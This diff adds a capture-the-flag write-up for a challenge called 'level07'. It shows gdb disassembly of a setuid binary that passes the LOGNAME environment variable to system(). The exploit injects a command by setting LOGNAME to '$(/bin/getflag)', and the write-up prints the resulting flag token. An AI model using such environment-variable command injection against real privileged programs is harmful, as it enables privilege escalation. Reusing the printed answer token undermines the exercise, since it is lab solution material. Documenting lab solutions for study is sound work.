@@ -1,0 +1,25 @@
+Upon arrival, we get a binary : `level07`
+It is owned by the flag07 user. On launch, it prints out the name of the file : `./level07 hello`
+Output : level07
+
+With a `strings level07`, we get the line : "/home/user/level07/level07.c"
+More interesting, we get lines such as "asprintf" and "LOGNAME".
+Using the `gdb` command like so, we can see :
+gdb level07
+disas main
+[...]
+   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
+[...]
+   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
+[...]
+   0x0804859a <+134>:	call   0x8048410 <system@plt>
+
+We can deduce that the program uses the `getenv()` function to fetch the value of the env variable LOGNAME, then proceeds to use the `asprintf(char **strp, const char *fmt, ...)` to allocate the value into a perfectly sized buffer, and finally print out the result to STDOUT calling the C `system(const char *command))` to use the shell's `echo` command;
+
+So, if we export an environment variable called "LOGNAME", we should get the flag :
+`export LOGNAME='$(/bin/getflag)' && ./level07`
+=> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+See : man 3 getenv
+man 3 asprintf
+man 3 system
